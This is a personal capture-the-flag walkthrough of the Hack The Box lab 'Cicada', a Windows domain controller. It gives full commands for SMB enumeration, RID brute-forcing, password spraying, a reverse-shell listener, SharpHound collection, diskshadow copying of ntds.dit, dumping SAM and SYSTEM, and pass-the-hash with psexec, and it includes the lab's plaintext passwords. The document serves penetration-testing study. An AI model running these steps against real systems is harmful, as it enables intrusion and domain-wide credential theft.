---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Cicada?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
---

---
# Information / Description

![](../../0.%20Assets/Cicada-1791134693057.webp)

---

# Walkthrough




We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports agai

Here you can find the dotfiles for kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

```

┌─[bl1nk㉿kali]─[~/engagements/cicada/nmap]─[󰦝 10.10.15.226]─[ 10.129.231.149]
└─❯ nmap $T -Pn -n -sVC  --min-rate 3000 -oX results.txt 53,88,135,139,389,445,464,593,636,3268,3269,5985,65274
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 19:28 +0200
Failed to resolve "53,88,135,139,389,445,464,593,636,3268,3269,5985,65274".
Nmap scan report for 10.129.231.149
Host is up (0.025s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-05 00:28:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-05T00:30:15+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-05T00:30:15+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-05T00:30:15+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-10-05T00:30:15+00:00; +6h59m59s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-05T00:29:36
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
```


I found the Domain name with `netexec` and added it to my `/etc/hosts`

![](../../0.%20Assets/Cicada-1791135134193.webp)

I tried anonymous access and guest access to the shares and had luck with `guest`

![](../../0.%20Assets/Cicada-1791135230178.webp)

I will spider now with netexec to retrieve all the files we can
```
netexec smb $T -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
```

![](../../0.%20Assets/Cicada-1791135703386.webp)

We find an interesting file

![](../../0.%20Assets/Cicada-1791135731601.webp)

I will take a look now in the Share we can open but i will in the mean time try to `rid-brute` the users

```
nxc smb $T -u 'guest' -p '' --rid-brute
```

![](../../0.%20Assets/Cicada-1791135477286.webp)

Wow, we where lucky here, let's treat this output 

```
nxc smb $T -u 'guest' -p '' --rid-brute 10000 | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```


![](../../0.%20Assets/Cicada-1791135528747.webp)

Great, we have a default password an a list of users, this means we can password spray

```
netexec smb $T -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb --continue-on-success
```


![](../../0.%20Assets/Cicada-1791135859171.webp)

I created a file where i am going to be storing all the credentials we find

![](../../0.%20Assets/Cicada-1791135965226.webp)

Okay let's see what we can do with this credentials

I used a tool called [nxcspray](https://github.com/NTHSec/nxcspray) to try all the different protocols with no luck let's do one more test with smb shares before we start attacking ``ad authentication``

![](../../0.%20Assets/Cicada-1791136185062.webp)

```
netexec smb $T -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

![](../../0.%20Assets/Cicada-1791136303124.webp)

A new share pops up:  `DEV` let's see what it can offer

![](../../0.%20Assets/Cicada-1791136663741.webp)


Seems like we can't really do much here so let's move to attacking AD

I tried ``AS-REP`` roasting with no luck

![](../../0.%20Assets/Cicada-1791136999505.webp)

I also tried `kerberoasting` with no luck so I used `ldapdomaindump`

```
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' $T
```

Opened a web server with python

```
python3 -m http.server 80
```

And in the description of one of the users

![](../../0.%20Assets/Cicada-1791138108288.webp)

![](../../0.%20Assets/Cicada-1791138115427.webp)

Cool, let's go over everything again

```
./nxcspray all $T -u david.orelious -p 'aRt$Lp#7t*VQ!3'
```

![](../../0.%20Assets/Cicada-1791138311761.webp)

We see the credentials are valid and we can go over `SMB` again

![](../../0.%20Assets/Cicada-1791138413828.webp)

And now we have access to the `DEV` share

Once we are in we find a script

![](../../0.%20Assets/Cicada-1791138453802.webp)

let's get it and see what is inside

![](../../0.%20Assets/Cicada-1791138504323.webp)

Another user enumerated, let's add it to our list and before we continue to enumerate further with this user I would like to see if we can `AS-REP` roast with david or even `kerberoast`


![1220](../../0.%20Assets/Cicada-1791138650248.webp)

![](../../0.%20Assets/Cicada-1791138699741.webp)

Nope, okay, let's move to `emily`

![](../../0.%20Assets/Cicada-1791138790854.webp)

`WinRM` shows as pwned which means we can access it

```
evil-winrm -i $T -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![](../../0.%20Assets/Cicada-1791138986680.webp)


For making it more stable I made a reverse shell connection via `Penelope`

```
penelope -O -p 1337 -a
```

![](../../0.%20Assets/Cicada-1791139401298.webp)

I transferred `sharphound` into the machine

![](../../0.%20Assets/Cicada-1791139656707.webp)

And did the recollection

```
powershell -ep bypass                 # bypass execution policy   
. .\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\emily.oscars.CICADA\Desktop" -OutputPrefix "corp_audit"
```

![](../../0.%20Assets/Cicada-1791140037764.webp)

The good thing about `penelope` is that I can directly download form the machine without having to start any `smb` shares or anything like that

![](../../0.%20Assets/Cicada-1791140170945.webp)

I will now start bloodhound with my setting and ingest the file

![973](../../0.%20Assets/Cicada-1791140367616.webp)

Now we just have to wait

Once it is ingested 

Right click on `emily` and set as `owned` then move to `cypher` and select "shortest paths to domain admins"


![569](../../0.%20Assets/Cicada-1791140616507.webp)


![1028](../../0.%20Assets/Cicada-1791140826578.webp)

We need to perform a `DCSync` attack, for that I will use impackets `secretsdump` (`bloodhound` tells us how to use it  )

![](../../0.%20Assets/Cicada-1791141067251.webp)

had some trouble doing the attack 

![](../../0.%20Assets/Cicada-1791142400377.webp)

So I moved to normal privilege escalation

I uploaded `powerUp` and run all checks found an interesting thing.

![](../../0.%20Assets/Cicada-1791142492464.webp)

This user is part of the backup operators group and has the right privileges to copy important files like the `SAM` and the `NTDS`

Move to a directory we have write permission over

```
cd C:\Windows\TEMP
```

In kali create the `viper.dsh` file

```
touch viper.dsh  
  
nano viper.dsh  
  
#copy this inside  
  
set context persistent nowriters  
add volume c: alias viper  
create  
expose %viper% x:
```

then make it compatible with windows

```
unix2dos viper.dsh
```

Upload it to windows

![](../../0.%20Assets/Cicada-1791143757246.webp)

then

```
diskshadow /s viper.dsh  
  
#If successfull  
  
robocopy /b x:\windows\ntds . ntds.dit
```

![](../../0.%20Assets/Cicada-1791143778027.webp)

Great! we have the `ntds.dit` file
Now let's get `SYSTEM` and `SAM` so we have all the hashes in the domain

```
reg save hklm\system c:\windows\tasks\system

reg save hklm\sam c:\windows\tasks\sam
```

Get those files back to kali and get the hashes with `secretsdump`

```
impacket-secretsdump -ntds ntds.dit -system system -sam sam local | tee dump.txt
```

![](../../0.%20Assets/Cicada-1791143831395.webp)

With the NTLM hash from the administrator we can `Pass-The-Hash` though `PsExec`

```
impacket-psexec cicada.htb/administrator@$T -hashes :2b87e7c93a3....
```


![](../../0.%20Assets/Cicada-1791143419955.webp)

And done!